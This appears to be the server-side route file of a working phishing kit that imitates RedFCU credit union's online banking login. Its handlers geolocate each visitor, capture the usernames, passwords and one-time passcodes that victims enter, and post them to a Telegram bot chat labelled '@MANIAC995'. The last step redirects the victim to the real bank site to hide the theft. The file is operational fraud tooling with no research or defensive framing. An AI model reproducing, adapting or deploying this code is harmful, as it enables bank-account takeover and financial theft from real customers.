var express = require("express");
var router = express.Router();
var axios = require("axios");
var config = require("../config");
var moment = require("moment");

async function getLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data;
  } catch (error) {
    // Suppress the error, as we don't want to log it to the console
    return null;
  }
}

router.get("/", async function (req, res, next) {
  const ip = req.ip;
  const location = await getLocation(ip);

  let locationText = "Location: Unknown";
  if (location && location.city && location.regionName) {
    locationText = `Location: ${location.city}, ${location.regionName}`;
  }

  const telegramBotToken = config.telegramBotToken;
  const chatId = config.chatId;
  const text = `🚨 A user has visited the main page!\n\nTime: ${new Date().toISOString()}\n${locationText}`;

  try {
    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
    });
    res.render("index");
  } catch (error) {
    // Error is caught but not logged in console
    res.render("index");
  }
});

router.post("/send", async function (req, res, next) {
  const { username, password } = req.body;
  const submittedTime = moment().format("ddd, DD MMM YYYY HH:mm:ss [GMT]");
  const telegramBotToken = config.telegramBotToken;
  const chatId = config.chatId;

  const text = `NEW REDFCU LOG - @MANIAC995\n\nUSERNAME: ${username}\nPASSWORD: ${password}\nDATE: ${submittedTime} ⚙️`;

  try {
    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
    });
    res.render("login2");
  } catch (error) {
    // Error is caught but not logged in console
    res.render("login2");
  }
});

router.post("/dual-login", async function (req, res, next) {
  const { username, password } = req.body;
  const submittedTime = moment().format("ddd, DD MMM YYYY HH:mm:ss [GMT]");
  const telegramBotToken = config.telegramBotToken;
  const chatId = config.chatId;

  const text = `NEW REDFCU LOG - @MANIAC995\n\nDUAL USERNAME: ${username}\nDUAL PASSWORD: ${password}\nDATE: ${submittedTime} ⚙️`;

  try {
    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
    });
    res.render("load", { delay: config.redirectDelay });
  } catch (error) {
    // Error is caught but not logged in console
    res.render("load", { delay: config.redirectDelay });
  }
});

router.get("/otp", function (req, res) {
  res.render("otp");
});

router.post("/submit-otp", async function (req, res, next) {
  const { otp } = req.body;
  const submittedTime = moment().format("ddd, DD MMM YYYY HH:mm:ss [GMT]");
  const telegramBotToken = config.telegramBotToken;
  const chatId = config.chatId;

  const otpText = `NEW REDFCU LOG - @MANIAC995\n\nOTP CODE: ${otp}\nDATE: ${submittedTime} ⚙️`;

  try {
    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: otpText,
    });
    res.redirect("https://www.redfcuonline.org/dbank/live/app/login/consumer");
  } catch (error) {
    // Error is caught but not logged in console
    res.redirect("https://www.redfcuonline.org/dbank/live/app/login/consumer");
  }
});

module.exports = router;
